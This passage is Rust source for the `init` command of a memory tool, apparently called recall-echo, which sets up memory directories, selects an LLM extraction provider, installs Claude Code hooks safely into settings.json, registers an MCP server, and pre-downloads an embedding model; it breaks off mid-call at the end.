// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.

//! Initialize the recall-echo memory system.
//!
//! Creates the directory structure and template files needed for four-layer
//! memory (graph, curated, short-term, long-term), picks an extraction
//! provider, installs Claude Code's hooks, registers the MCP server with every
//! agent CLI on the machine, and downloads the embedding model.
//!
//! # What `init` asks
//!
//! As little as it can get away with. Setup friction is what loses users, so
//! every question here has to earn itself:
//!
//! - one agent CLI installed — no question at all, that is the provider;
//! - several — one short menu, defaulted to the CLI the session is running
//!   under, because that is the subscription the user just proved they have;
//! - none — the full provider menu, since now the choice really is open.
//!
//! Nothing prompts unless stderr is a terminal ([`atty_check`]); a scripted or
//! piped install takes the same defaults without blocking.
//!
//! # What it does without asking
//!
//! Hooks, MCP registration and the model download are consequences of what is
//! installed, not preferences, so they happen. Each is idempotent, each reports
//! itself, and none of them can fail the command:
//!
//! - hooks are matched by command name, so re-running never duplicates one;
//! - MCP servers live in a map keyed by name in every client, so re-registering
//!   the same name is a no-op (see [`crate::agent_cli`]);
//! - the model is a content-addressed cache, so a second warm is a no-op.
//!
//! # The build-directory guard
//!
//! A binary under `target/debug` or `target/release` is a test harness or a
//! working copy, not something a user's hooks and MCP configs should be pinned
//! to for the life of the install. Everything that writes *outside* the entity
//! root — hooks, MCP registration — is skipped there, which is also what keeps
//! `cargo test` from repointing the developer's live tooling at a test binary
//! or downloading 127 MB per test.

use std::fs;
use std::io::{self, BufRead, Write as _};
use std::path::Path;

use crate::agent_cli::{self, AgentCli, McpReport, McpStatus};
use crate::config::{self, Config, LlmSection, Provider};
use crate::error::RecallError;
use crate::paths;
use crate::theme::{BAD, BOLD, DIM, GOOD, RESET, WARN};
use crate::transcript::Source;

const MEMORY_TEMPLATE: &str = "# Memory\n\n\
<!-- recall-echo: Curated memory. Distilled facts, preferences, patterns. -->\n\
<!-- Keep under 200 lines. Only write confirmed, stable information. -->\n";

const ARCHIVE_TEMPLATE: &str = "# Conversation Archive\n\n\
| # | Date | Session | Topics | Messages | Duration |\n\
|---|------|---------|--------|----------|----------|\n";

/// Roughly what the BGE-Small-EN-v1.5 ONNX weights weigh, for the one line
/// that tells the user why their terminal is busy.
const MODEL_DOWNLOAD_SIZE: &str = "~127 MB";

enum Status {
    Created,
    Exists,
    Error,
}

fn print_status(status: Status, msg: &str) {
    match status {
        Status::Created => eprintln!("  {GOOD}✓{RESET} {msg}"),
        Status::Exists => eprintln!("  {WARN}~{RESET} {msg}"),
        Status::Error => eprintln!("  {BAD}✗{RESET} {msg}"),
    }
}

/// Point at a stranded pre-4.2 archive before it strands.
///
/// A claude-style install archived at `<root>/conversations`. Init creates
/// the entity layout, which hooks and reads will now prefer — a populated
/// legacy directory would otherwise be left behind silently: invisible to
/// search and the graph, with numbering restarting at 001 in the new place.
fn notice_legacy_conversations(entity_root: &Path, new_dir: &Path) {
    let legacy = entity_root.join("conversations");
    let legacy_count = fs::read_dir(&legacy).map(|d| d.count()).unwrap_or(0);
    let new_count = fs::read_dir(new_dir).map(|d| d.count()).unwrap_or(0);
    if legacy_count > 0 && new_count == 0 {
        print_status(
            Status::Exists,
            &format!(
                "{legacy_count} archives in the legacy location {} — memory now lives at {}. \
                 Move them across to keep them searchable:",
                legacy.display(),
                new_dir.display()
            ),
        );
        eprintln!("      mv {}/* {}/", legacy.display(), new_dir.display());
        eprintln!(
            "      {DIM}(and review {}/ARCHIVE.md against the one in memory/){RESET}",
            entity_root.display()
        );
    }
}

fn ensure_dir(path: &Path) {
    if !path.exists() {
        if let Err(e) = fs::create_dir_all(path) {
            print_status(
                Status::Error,
                &format!("Failed to create {}: {e}", path.display()),
            );
        }
    }
}

fn write_if_not_exists(path: &Path, content: &str, label: &str) {
    if path.exists() {
        print_status(
            Status::Exists,
            &format!("{label} already exists — preserved"),
        );
    } else {
        match fs::write(path, content) {
            Ok(()) => print_status(Status::Created, &format!("Created {label}")),
            Err(e) => print_status(Status::Error, &format!("Failed to create {label}: {e}")),
        }
    }
}

// ── Choosing an extraction provider ──────────────────────────────────────

/// Pick the provider that will turn conversations into knowledge.
///
/// `detected` is every agent CLI whose binary is on this machine, in
/// preference order. `None` means the user chose to configure it later.
fn select_provider(reader: &mut dyn BufRead, detected: &[AgentCli]) -> Option<Provider> {
    match detected {
        // Nothing to choose between: the answer is obvious, so do not ask it.
        [only] => {
            print_status(
                Status::Created,
                &format!("found {only} — using it for extraction"),
            );
            Some(only.provider())
        }
        [] => {
            eprintln!(
                "\n  {WARN}~{RESET} No agent CLI found. Extraction needs a model provider — \
                 {BOLD}ollama{RESET} is the free, local option."
            );
            prompt_any_provider(reader)
        }
        several => prompt_installed_cli(reader, several),
    }
}

/// The CLI a menu should default to: the one this session is running under,
/// else Claude Code, else the first installed.
fn default_cli(detected: &[AgentCli]) -> AgentCli {
    let running_under = agent_cli::current().filter(|cli| detected.contains(cli));
    running_under
        .or_else(|| {
            detected
                .contains(&AgentCli::ClaudeCode)
                .then_some(AgentCli::ClaudeCode)
        })
        .or_else(|| detected.first().copied())
        .unwrap_or(AgentCli::ClaudeCode)
}

/// Short menu over the CLIs that are actually installed.
fn prompt_installed_cli(reader: &mut dyn BufRead, detected: &[AgentCli]) -> Option<Provider> {
    let default = default_cli(detected);
    if !atty_check() {
        print_status(
            Status::Created,
            &format!(
                "{} agent CLIs found — using {default} for extraction",
                detected.len()
            ),
        );
        return Some(default.provider());
    }

    let default_index = detected.iter().position(|cli| *cli == default).unwrap_or(0) + 1;

    eprintln!("\n{BOLD}Which CLI should recall-echo use to extract knowledge?{RESET}");
    for (index, cli) in detected.iter().enumerate() {
        let note = if *cli == default {
            if agent_cli::current() == Some(*cli) {
                "— you're running under it (default)"
            } else {
                "— (default)"
            }
        } else {
            ""
        };
        eprintln!(
            "  {BOLD}{}{RESET}) {:<12}{DIM}{note}{RESET}",
            index + 1,
            cli.label()
        );
    }
    eprintln!("  {BOLD}o{RESET}) other       {DIM}— Claude API, Ollama, or decide later{RESET}");
    eprint!("\n  Choice [{default_index}]: ");
    io::stderr().flush().ok();

    let mut input = String::new();
    if reader.read_line(&mut input).is_err() {
        return Some(default.provider());
    }

    let answer = input.trim().to_lowercase();
    if answer.is_empty() {
        return Some(default.provider());
    }
    if answer == "o" || answer == "other" {
        return prompt_any_provider(reader);
    }
    if let Some(cli) = answer
        .parse::<usize>()
        .ok()
        .and_then(|n| detected.get(n.wrapping_sub(1)))
    {
        return Some(cli.provider());
    }
    if let Some(cli) = detected.iter().find(|cli| cli.label() == answer) {
        return Some(cli.provider());
    }
    eprintln!("  {WARN}~{RESET} Unknown choice, defaulting to {default}");
    Some(default.provider())
}

/// The full provider menu — every provider recall-echo speaks, installed or
/// not. Reached when nothing was detected, or when the user asks for it.
///
/// Returns `None` if the user chose to configure it later.
fn prompt_any_provider(reader: &mut dyn BufRead) -> Option<Provider> {
    if !atty_check() {
        return Some(Provider::Anthropic);
    }

    eprintln!("\n{BOLD}LLM provider for entity extraction:{RESET}");
    eprintln!("  {BOLD}1{RESET}) anthropic   {DIM}— Claude API (default){RESET}");
    eprintln!("  {BOLD}2{RESET}) ollama      {DIM}— Local models via Ollama, free{RESET}");
    eprintln!(
        "  {BOLD}3{RESET}) claude-code {DIM}— Spawns your `claude` CLI (subscription){RESET}"
    );
    eprintln!(
        "  {BOLD}4{RESET}) gemini      {DIM}— Spawns your `gemini` CLI (subscription){RESET}"
    );
    eprintln!("  {BOLD}5{RESET}) grok        {DIM}— Spawns your `grok` CLI (subscription){RESET}");
    eprintln!("  {BOLD}6{RESET}) codex       {DIM}— Spawns your `codex` CLI (subscription){RESET}");
    eprintln!(
        "  {BOLD}7{RESET}) skip        {DIM}— Configure later with `recall-echo config`{RESET}"
    );
    eprint!("\n  Choice [1]: ");
    io::stderr().flush().ok();

    let mut input = String::new();
    if reader.read_line(&mut input).is_err() {
        return None;
    }

    match input.trim() {
        "" | "1" | "anthropic" => Some(Provider::Anthropic),
        "2" | "ollama" => Some(Provider::Openai),
        "3" | "claude-code" => Some(Provider::ClaudeCode),
        "4" | "gemini" => Some(Provider::Gemini),
        "5" | "grok" => Some(Provider::Grok),
        "6" | "codex" => Some(Provider::Codex),
        "7" | "skip" => None,
        _ => {
            eprintln!("  {WARN}~{RESET} Unknown choice, defaulting to anthropic");
            Some(Provider::Anthropic)
        }
    }
}

/// Write `.recall-echo.toml` if there is none, and report the provider in
/// force either way. `None` means extraction is not configured.
fn configure_llm(
    reader: &mut dyn BufRead,
    memory_dir: &Path,
    detected: &[AgentCli],
) -> Option<Provider> {
    if config::exists(memory_dir) {
        print_status(
            Status::Exists,
            ".recall-echo.toml already exists — preserved",
        );
        return Some(config::load(memory_dir).llm.provider);
    }

    let Some(provider) = select_provider(reader, detected) else {
        print_status(
            Status::Exists,
            "Skipped LLM config — run `recall-echo config set provider <name>` later",
        );
        return None;
    };

    let cfg = Config {
        llm: LlmSection {
            provider: provider.clone(),
            ..LlmSection::default()
        },
        ..Config::default()
    };
    match config::save(memory_dir, &cfg) {
        Ok(()) => {
            print_status(
                Status::Created,
                &format!(
                    "Created .recall-echo.toml (provider: {})",
                    label_of(&provider)
                ),
            );
            Some(provider)
        }
        Err(e) => {
            print_status(Status::Error, &format!("Failed to write config: {e}"));
            None
        }
    }
}

/// The provider's name as a user knows it.
fn label_of(provider: &Provider) -> String {
    match provider {
        Provider::Openai => "ollama (openai-compat)".to_string(),
        other => other.to_string(),
    }
}

/// The provider's name plus what it will cost.
fn extraction_line(provider: &Provider) -> String {
    match provider {
        Provider::Anthropic => "anthropic (Claude API — set ANTHROPIC_API_KEY)".into(),
        Provider::Openai => "ollama (local models — free)".into(),
        Provider::Cli => "custom CLI (from `[llm.cli]`)".into(),
        cli => format!("{cli} (your subscription — no API billing)"),
    }
}

// ── Graph and embedding model ────────────────────────────────────────────

/// Initialize the graph store in memory/graph/.
fn init_graph(runtime: &tokio::runtime::Runtime, memory_dir: &Path) {
    let graph_dir = memory_dir.join("graph");
    if graph_dir.exists() {
        print_status(Status::Exists, "graph/ already exists — preserved");
        return;
    }

    match runtime.block_on(crate::graph::GraphMemory::open(&graph_dir)) {
        Ok(_) => print_status(Status::Created, "Created graph/ (SurrealDB)"),
        Err(e) => print_status(Status::Error, &format!("Failed to init graph: {e}")),
    }
}

/// What became of the embedding model.
#[derive(Debug, Clone, PartialEq, Eq)]
enum WarmOutcome {
    Ready,
    Skipped(&'static str),
    Failed(String),
}

/// Download and load the embedding model now, rather than on first use.
///
/// The first embedding a user ever asks for otherwise stalls for a ~127 MB
/// download with no explanation — the single most convincing way to look
/// broken. Doing it here, last and announced, makes it a setup step.
///
/// Interruptible: nothing after this point is required, so Ctrl-C leaves a
/// working install and the model downloads on first use instead. Failure is
/// reported and never fatal, so an offline install still succeeds.
fn warm_embedding_model(memory_dir: &Path, roots: &paths::ConfigRoots) -> WarmOutcome {
    if paths::is_build_dir(roots.recall_bin()) {
        return WarmOutcome::Skipped("running from a build directory");
    }
    if !roots.spawns_agents() {
        return WarmOutcome::Skipped("sandboxed configuration roots");
    }

    let models_dir = memory_dir.join("graph").join("models");
    if let Err(e) = fs::create_dir_all(&models_dir) {
        return WarmOutcome::Failed(format!("could not create {}: {e}", models_dir.display()));
    }

    let cached = fs::read_dir(&models_dir).is_ok_and(|mut entries| entries.next().is_some());
    if cached {
        eprintln!("  {DIM}… loading the embedding model{RESET}");
    } else {
        eprintln!(
            "  {DIM}… downloading the embedding model ({MODEL_DOWNLOAD_SIZE}, once) — \
             everything else is already set up, Ctrl-C is safe{RESET}"
        );
    }

    match crate::graph::embed::FastEmbedder::new(&models_dir) {
        Ok(_) => WarmOutcome::Ready,
        Err(e) => WarmOutcome::Failed(e.to_string()),
    }
}

// ── Claude Code hooks ────────────────────────────────────────────────────

/// Auto-configure Claude Code hooks (settings.json).
/// Returns true if hooks were configured.
///
/// The file is `<roots.claude_dir()>/settings.json` — `~/.claude/settings.json`
/// in production, a sandbox under test — regardless of where entity_root is.
/// The binary the hooks will invoke comes from `roots` too, so nothing here is
/// decided by the path this process happens to be running from.
fn configure_hooks(roots: &paths::ConfigRoots, entity_root: &Path) -> bool {
    let Some(claude_dir) = roots.claude_dir() else {
        return false;
    };

    // A path under a build directory is a test harness or a debug build, not
    // something a user's hooks should be pinned to for the life of the install.
    if paths::is_build_dir(roots.recall_bin()) {
        print_status(
            Status::Exists,
            "Skipped hook install — running from a build directory",
        );
        return false;
    }

    install_hooks(
        &claude_dir.join("settings.json"),
        entity_root,
        roots.recall_bin(),
    )
}

/// Install or repair the three hooks in the settings file at `settings_path`.
///
/// Split from [`configure_hooks`] so the writer can be exercised against a
/// named file with a named binary: where it writes is an argument, never a
/// path this process resolves for itself (#59).
fn install_hooks(settings_path: &Path, entity_root: &Path, recall_bin: &str) -> bool {
    // Absent means a fresh install. Unreadable or unparseable means the
    // user's existing configuration — falling back to `{}` there would
    // overwrite everything they have (permissions, MCP servers, env) with a
    // file containing nothing but these hooks.
    let mut settings: serde_json::Value = if settings_path.exists() {
        let content = match fs::read_to_string(settings_path) {
            Ok(c) => c,
            Err(e) => {
                print_status(
                    Status::Error,
                    &format!(
                        "Could not read {} ({e}) — hooks not configured",
                        settings_path.display()
                    ),
                );
                return false;
            }
        };
        match serde_json::from_str(&content) {
            Ok(v) => v,
            Err(e) => {
                print_status(
                    Status::Error,
                    &format!(
                        "{} is not valid JSON ({e}) — refusing to overwrite it; \
                         fix the file and re-run init",
                        settings_path.display()
                    ),
                );
                return false;
            }
        }
    } else {
        serde_json::json!({})
    };

    let root = fs::canonicalize(entity_root).unwrap_or_else(|_| entity_root.to_path_buf());
    // A control character (a newline especially) inside a shell command line
    // is unrecoverable for the user reading settings.json later.
    if root.display().to_string().chars().any(char::is_control) {
        print_status(
            Status::Error,
            "Entity root contains control characters — refusing to write it into a shell hook",
        );
        return false;
    }

    // The binary path is interpolated bare (the matcher recognizes hooks by
    // literal shape, so it cannot be quoted). A replaced-in-place binary or a
    // path outside the conservative install-path alphabet is refused rather
    // than baked into a broken or dangerous command line.
    if recall_bin.ends_with(" (deleted)") {
        print_status(
            Status::Error,
            "The running binary was replaced on disk during init — re-run init",
        );
        return false;
    }
    if !is_shell_safe_bin(recall_bin) {
        print_status(
            Status::Error,
            &format!(
                "Refusing to write hooks: binary path {recall_bin} contains characters unsafe \
                 in a shell command — install recall-echo at a plain path and re-run init"
            ),
        );
        return false;
    }

    let mut notes: Vec<String> = Vec::new();
    let changed = match upsert_recall_hooks(&mut settings, recall_bin, &root, &mut notes) {
        Ok(changed) => changed,
        Err(why) => {
            print_status(
                Status::Error,
                &format!("settings.json: {why} — hooks not configured"),
            );
            return false;
        }
    };
    for note in &notes {
        print_status(Status::Exists, note);
    }

    if changed {
        match serde_json::to_string_pretty(&settings) {
            Ok(content) => match write_settings_atomically(settings_path, &content) {
                Ok(()) => {
                    print_status(
                        Status::Created,
                        "Configured SessionStart + SessionEnd + PreCompact hooks in settings.json",
                    );
                    return true;
                }
                Err(e) => print_status(
                    Status::Error,
                    &format!("Failed to write settings.json: {e}"),
                ),
            },
            Err(e) => print_status(Status::Error, &format!("Failed to serialize settings: {e}")),
        }
    } else {
        print_status(Status::Exists, "Hooks already configured in settings.json");
        return true;
    }

    false
}

/// Replace settings.json without a window where it is truncated or absent.
///
/// The previous content is kept as `settings.json.bak`; the new content lands
/// via a temp file and rename, keeping the original file's permissions — the
/// file can hold permission allowlists and credentials, so its mode is not
/// ours to loosen.
fn write_settings_atomically(path: &Path, content: &str) -> std::io::Result<()> {
    if path.exists() {
        let _ = fs::copy(path, path.with_extension("json.bak"));
    }
    // Pid-suffixed so concurrent inits cannot rename each other's half-written
    // temp into place.
    let tmp = path.with_extension(format!("json.tmp.{}", std::process::id()));
    let _ = fs::remove_file(&tmp);
    // Owner-only from birth: the file can hold credentials, and creating at
    // the umask default before tightening leaves a world-readable window.
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        let mut f = fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o600)
            .open(&tmp)?;
        f.write_all(content.as_bytes())?;
        f.sync_all()?;
    }
    #[cfg(not(unix))]
    fs::write(&tmp, content)?;
    if let Ok(meta) = fs::metadata(path) {
        let _ = fs::set_permissions(&tmp, meta.permissions());
    }
    fs::rename(&tmp, path)
}

/// Quote a path for use inside a shell hook command line.
///
/// Always single-quoted: POSIX single quotes disable every expansion — `$`,
/// backticks, `;`, `|`, spaces — and an embedded `'` is closed, escaped, and
/// reopened. Quoting only "when needed" is how metacharacters slip through.
fn shell_path(path: &Path) -> String {
    format!("'{}'", path.display().to_string().replace('\'', r"'\''"))
}

/// Whether a binary path is safe to interpolate bare into a hook command.
///
/// The binary path is the one interpolated value that cannot be quoted: the
/// existing-hook matcher recognizes our commands by their literal shape, and
/// quoting would change it. Unlike the entity root — arbitrary user data —
/// an install path is conventional, so a conservative character set covers
/// every real install and anything outside it is refused with a message
/// rather than baked into a broken or dangerous command line.
fn is_shell_safe_bin(path: &str) -> bool {
    !path.is_empty()
        && path
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "/._+-".contains(c))
}

/// Shell operators (scanned outside single-quoted spans) whose presence marks
/// a hook command as hand-customized.
///
/// The canonical commands this installer writes contain none of these outside
/// quotes, so a recall-echo hook that does — `recall-echo archive-session ||
/// true`, a chained cleanup, a redirect — was shaped by the user on purpose,
/// and rewriting it would silently destroy that intent. Prefix wrappers
/// (`timeout`, `nice`, `env`) carry no operator at all; those are caught by
/// the canonical-shape check in [`is_bare_recall_invocation`] instead.
const SHELL_OPERATORS: [&str; 8] = [";", "&", "|", ">", "<", "$", "`", "\n"];

/// The command text with single-quoted spans removed — the only part where a
/// shell operator means anything. The entity root recall-echo itself quotes
/// may legally contain `;` or `$`; scanning through the quotes would make our
/// own canonical hooks look customized and permanently unrepairable.
fn strip_single_quoted(cmd: &str) -> String {
    let mut out = String::new();
    let mut in_quote = false;
    for c in cmd.chars() {
        match c {
            '\'' => in_quote = !in_quote,
            _ if in_quote => {}
            _ => out.push(c),
        }
    }
    out
}

/// Whether a hook command is a plain recall-echo invocation this installer
/// may rewrite: the first token is a recall-echo binary, the second is the
/// expected subcommand, and no shell operator appears outside quotes.
/// Anything else — a `timeout`/`nice`/`env` wrapper, a `|| true` guard, a
/// chained command — is user configuration.
fn is_bare_recall_invocation(cmd: &str, subcommand: &str) -> bool {
    if SHELL_OPERATORS
        .iter()
        .any(|op| strip_single_quoted(cmd).contains(op))
    {
        return false;
    }
    let mut parts = cmd.split_whitespace();
    let Some(first) = parts.next() else {
        return false;
    };
    Path::new(first)
        .file_name()
        .is_some_and(|f| f == "recall-echo")
        && parts.next() == Some(subcommand)
}

/// Install or repair the three recall-echo hooks in a settings.json value.
///
/// The entity root is baked into every command: hooks run with the harness's
/// cwd, which is wherever the user happens to be working, and a bare
/// `recall-echo archive-session` resolves against that — capture then only
/// works when the shell sits in the entity root. MCP registration already
/// bakes the root for reads; this is the write-side counterpart.
///
/// A plain recall-echo hook whose command differs from the expected line —
/// the bare pre-4.2 form, a stale root — is rewritten in place and reported,
/// so re-running `init` repairs a broken install instead of declaring it
/// present. Duplicate recall-echo hooks are collapsed to one — a repaired
/// duplicate would archive every session twice at double the extraction
/// bill. Two kinds of hooks are never rewritten: ones that are not
/// recall-echo's at all, and customized invocations (wrappers, guards,
/// chains — see [`is_bare_recall_invocation`]), each reported through
/// `notes` with the canonical command so the user can migrate it by hand.
///
/// Returns `Ok(changed)`, or `Err` naming what in the settings shape made
/// the install unsafe to attempt.
fn upsert_recall_hooks(
    settings: &mut serde_json::Value,
    recall_bin: &str,
    entity_root: &Path,
    notes: &mut Vec<String>,
) -> Result<bool, String> {
    let root = shell_path(entity_root);
    // SessionStart fires once per session (startup or resume) — injects
    // EPHEMERAL.md into context via stdout. Skips `clear` (user reset) and
    // `compact` (we just recovered from a compaction, no prior session to
    // surface). `consume` takes the root positionally.
    let plan: [(&str, Option<&str>, &str, String); 3] = [
        (
            "SessionStart",
            Some("startup|resume"),
            "consume",
            format!("{recall_bin} consume {root}"),
        ),
        (
            "SessionEnd",
            None,
            "archive-session",
            format!("{recall_bin} archive-session --entity-root {root}"),
        ),
        (
            "PreCompact",
            None,
            "checkpoint",
            format!("{recall_bin} checkpoint --trigger precompact --entity-root {root}"),
        ),
    ];

    let hooks = settings
        .as_object_mut()
        .and_then(|o| {
            o.entry("hooks")
                .or_insert_with(|| serde_json::json!({}))
                .as_object_mut()
        })
        .ok_or_else(|| "settings.json root is not a JSON object".to_string())?;

    let mut changed = false;
    for (event, matcher, subcommand, expected) in plan {
        if upsert_hook(hooks, event, matcher, subcommand, &expected, notes)? {
            changed = true;
        }
    }
    Ok(changed)
}

/// Ensure one event carries exactly one canonical recall-echo hook command.
///
/// Every recall-echo hook under the event is considered: the first canonical
/// (or repairable-and-repaired) occurrence stands, further duplicates are
/// removed, customized invocations are reported and left alone. A group
/// whose hooks are all exactly ours also gets its matcher synced. When no
/// recall-echo hook exists at all, a new group is appended.
///
/// Returns `Ok(changed)`, or `Err` when the event's value is not an array —
/// someone else's structure, not ours to repair or append to.
fn upsert_hook(
    hooks: &mut serde_json::Map<String, serde_json::Value>,
    event: &str,
    matcher: Option<&str>,
    subcommand: &str,
    expected: &str,
    notes: &mut Vec<String>,
) -> Result<bool, String> {
    // Recognize ours by the base command name, not the full binary path.
    let marker = format!("recall-echo {subcommand}");
    let not_array = || format!("\"hooks\".\"{event}\" is not an array — fix it and re-run init");

    let mut changed = false;
    let mut found = false;
    let mut have_canonical = false;

    if let Some(value) = hooks.get_mut(event) {
        let arr = value.as_array_mut().ok_or_else(not_array)?;
        for group in arr.iter_mut() {
            let Some(inner) = group.get_mut("hooks").and_then(|h| h.as_array_mut()) else {
                continue;
            };
            let mut i = 0;
            while i < inner.len() {
                let Some(cmd) = inner[i]
                    .get("command")
                    .and_then(|c| c.as_str())
                    .map(String::from)
                else {
                    i += 1;
                    continue;
                };
                if !cmd.contains(&marker) {
                    i += 1;
                    continue;
                }
                found = true;
                let repairable = cmd == expected || is_bare_recall_invocation(&cmd, subcommand);
                if repairable && have_canonical {
                    inner.remove(i);
                    notes.push(format!("{event}: removed a duplicate recall-echo hook"));
                    changed = true;
                    continue; // index now points at the next element
                }
                if cmd == expected {
                    have_canonical = true;
                } else if repairable {
                    inner[i]["command"] = serde_json::Value::String(expected.to_string());
                    notes.push(format!(
                        "{event}: updated recall-echo hook to carry the entity root"
                    ));
                    have_canonical = true;
                    changed = true;
                } else {
                    notes.push(format!(
                        "{event}: left a customized recall-echo hook unchanged: {cmd} — note it \
                         does not carry the entity root; the canonical command is: {expected}"
                    ));
                }
                i += 1;
            }
            // Sync the matcher only when every hook in the group is exactly
            // ours — a shared group's matcher governs foreign hooks too.
            let all_ours = !inner.is_empty()
                && inner
                    .iter()
                    .all(|h| h.get("command").and_then(|c| c.as_str()) == Some(expected));
            if all_ours {
                if let Some(m) = matcher {
                    if group.get("matcher").and_then(|v| v.as_str()) != Some(m) {
                        group["matcher"] = serde_json::Value::String(m.to_string());
                        changed = true;
                    }
                }
            }
        }
        // A dedup pass can leave a group with no hooks; an empty group is
        // noise the harness still iterates.
        arr.retain(|group| {
            group
                .get("hooks")
                .and_then(|h| h.as_array())
                .is_none_or(|inner| !inner.is_empty())
        });
    }

    if found {
        return Ok(changed);
    }

    let arr = hooks
        .entry(event)
        .or_insert_with(|| serde_json::json!([]))
        .as_array_mut()
        .ok_or_else(not_array)?;
    let mut group = serde_json::json!({
        "hooks": [{"type": "command", "command": expected}]
    });
    if let Some(m) = matcher {
        group["matcher"] = serde_json::Value::String(m.to_string());
    }
    arr.push(group);
    Ok(true)
}

// ── MCP registration ─────────────────────────────────────────────────────

/// Register the MCP server with every agent CLI on the machine.
///
/// Without this the graph is read-only in theory and unread in practice: the
/// server exists, and every user has to find the `mcp add` line in the README
/// to reach it. Doing it here means memory is queryable from the next session
/// on, in every client the user already has.
fn register_mcp_clients(
    runtime: &tokio::runtime::Runtime,
    detected: &[AgentCli],
    entity_root: &Path,
    roots: &paths::ConfigRoots,
) -> Vec<McpReport> {
    if detected.is_empty() {
        return Vec::new();
    }

    if !roots.spawns_agents() {
        print_status(
            Status::Exists,
            "Skipped MCP registration — sandboxed configuration roots",
        );
        return Vec::new();
    }
    let exe = roots.recall_bin().to_string();
    if paths::is_build_dir(&exe) {
        print_status(
            Status::Exists,
            "Skipped MCP registration — running from a build directory",
        );
        return Vec::new();
    }

    let root = fs::canonicalize(entity_root).unwrap_or_else(|_| entity_root.to_path_buf());
    let reports: Vec<McpReport> = runtime.block_on(async {
        let mut reports = Vec::with_capacity(detected.len());
        for cli in detected {
            reports.push(agent_cli::register_mcp(*cli, &exe, &root, roots).await);
        }
        reports
    });

    for report in &reports {
        match &report.status {
            McpStatus::Registered => print_status(
                Status::Created,
                &format!("Registered MCP server with {}", report.cli),
            ),
            McpStatus::AlreadyRegistered => print_status(
                Status::Exists,
                &format!("MCP server already registered with {}", report.cli),
            ),
            McpStatus::Failed(detail) => {
                print_status(
                    Status::Error,
                    &format!("Could not register MCP with {}: {detail}", report.cli),
                );
                eprintln!("    {DIM}run it yourself: {}{RESET}", report.command);
            }
        }
    }
    reports
}

// ── Summary ──────────────────────────────────────────────────────────────

/// Everything `init` decided, as the closing summary needs it.
struct Summary {
    memory_dir: std::path::PathBuf,
    provider: Option<Provider>,
    capture: Vec<Source>,
    mcp: Vec<McpReport>,
    embedder: WarmOutcome,
}

impl Summary {
    /// Clients that will be able to query memory over MCP.
    fn mcp_ready(&self) -> Vec<&'static str> {
        self.mcp
            .iter()
            .filter(|report| !matches!(report.status, McpStatus::Failed(_)))
            .map(|report| report.cli.label())
            .collect()
    }
}

/// Tell the user what will now happen without them doing anything.
fn print_summary(summary: &Summary) {
    eprintln!("\n{BOLD}Setup complete.{RESET}\n");
    print_status(
        Status::Created,
        &format!("memory initialised at {}", summary.memory_dir.display()),
    );

    match &summary.provider {
        Some(provider) => print_status(
            Status::Created,
            &format!("extraction: {}", extraction_line(provider)),
        ),
        None => print_status(
            Status::Exists,
            "extraction: not configured — `recall-echo config set provider <name>`",
        ),
    }

    if summary.capture.is_empty() {
        print_status(
            Status::Exists,
            "capture: no agent CLI has recorded sessions here yet",
        );
    } else {
        let names: Vec<&str> = summary.capture.iter().map(Source::as_str).collect();
        print_status(Status::Created, &format!("capture: {}", names.join(", ")));
    }

    let ready = summary.mcp_ready();
    if !ready.is_empty() {
        print_status(
            Status::Created,
            &format!("MCP registered: {}", ready.join(", ")),
        );
    }

    match &summary.embedder {
        WarmOutcome::Ready => print_status(Status::Created, "embedding model ready"),
        WarmOutcome::Skipped(reason) => print_status(
            Status::Exists,
            &format!("embedding model not warmed ({reason}) — downloads on first use"),
        ),
        WarmOutcome::Failed(detail) => print_status(
            Status::Exists,
            &format!("embedding model not downloaded ({detail}) — retries on first use"),
        ),
    }

    eprintln!("\n  {BOLD}Your next session will be remembered.{RESET}\n");
    eprintln!("  {DIM}recall-echo status       — is it healthy, what has it got{RESET}");
    eprintln!("  {DIM}recall-echo config show  — what it decided{RESET}");
    eprintln!();
}

/// Check if stderr is a terminal (for interactive prompts).
fn atty_check() -> bool {
    use std::io::IsTerminal;
    std::io::stderr().is_terminal()
}

// ── Entry point ──────────────────────────────────────────────────────────

/// Initialize memory structure at the given entity root.
///
/// Creates:
/// ```text
/// {entity_root}/memory/
/// ├── MEMORY.md
/// ├── EPHEMERAL.md
/// ├── ARCHIVE.md
/// ├── .recall-echo.toml
/// ├── graph/
/// └── conversations/
/// ```
pub fn run(entity_root: &Path) -> Result<(), RecallError> {
    let stdin = io::stdin();
    let mut reader = stdin.lock();
    run_with_reader(entity_root, &mut reader)
}

/// Init with an injectable reader, against the real user configuration.
pub fn run_with_reader(entity_root: &Path, reader: &mut dyn BufRead) -> Result<(), RecallError> {
    run_with(entity_root, reader, &paths::ConfigRoots::from_env())
}

/// Init with both the reader and the global destinations injected.
///
/// `roots` decides where the hook file, the persisted entity root and any
/// agent-CLI config land. Pass [`paths::ConfigRoots::sandboxed`] and nothing
/// outside that directory can be written, whatever this binary's path is (#59).
pub fn run_with(
    entity_root: &Path,
    reader: &mut dyn BufRead,
    roots: &paths::ConfigRoots,
) -> Result<(), RecallError> {
    if !entity_root.exists() {
        return Err(RecallError::NotInitialized(format!(
            "Directory not found: {}\n  Create the directory first, or run from a valid path.",
            entity_root.display()
        )));
    }

    eprintln!("\n{BOLD}recall-echo{RESET} — initializing memory system\n");

    let memory_dir = entity_root.join("memory");
    let conversations_dir = memory_dir.join("conversations");
    ensure_dir(&memory_dir);
    ensure_dir(&conversations_dir);
    notice_legacy_conversations(entity_root, &conversations_dir);

    // Pin this root for flagless hook invocations (#46): capture must land in
    // the store the MCP server serves, not wherever the session's cwd is.
    match roots.persist_entity_root(entity_root) {
        Ok(paths::PersistOutcome::Written(file)) => print_status(
            Status::Created,
            &format!("Entity root persisted to {}", file.display()),
        ),
        Ok(paths::PersistOutcome::Skipped(why)) => print_status(
            Status::Exists,
            &format!("Skipped persisting the entity root — {why}"),
        ),
        Err(e) => print_status(
            Status::Error,
            &format!("Could not persist entity root: {e}"),
        ),
    }

    // Write MEMORY.md (never overwrite)
    write_if_not_exists(&memory_dir.join("MEMORY.md"), MEMORY_TEMPLATE, "MEMORY.md");

    // Write EPHEMERAL.md (never overwrite)
    write_if_not_exists(&memory_dir.join("EPHEMERAL.md"), "", "EPHEMERAL.md");

    // Write ARCHIVE.md (never overwrite)
    write_if_not_exists(
        &memory_dir.join("ARCHIVE.md"),
